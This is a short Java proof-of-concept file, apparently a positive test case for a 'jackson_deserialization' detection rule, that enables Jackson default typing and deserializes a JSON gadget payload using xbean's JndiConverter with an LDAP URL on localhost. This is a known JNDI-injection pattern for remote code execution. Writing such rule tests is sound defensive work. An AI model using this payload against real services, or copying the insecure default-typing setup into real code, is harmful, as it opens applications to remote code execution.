package com.patrilic.jackson;
// ruleid:jackson_deserialization
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;
public class poc {
public static void main(String args[]) throws IOException {
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();
String json = "[\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://localhost:1389/ExportObject\"}]";
mapper.readValue(json, Object.class);
}
}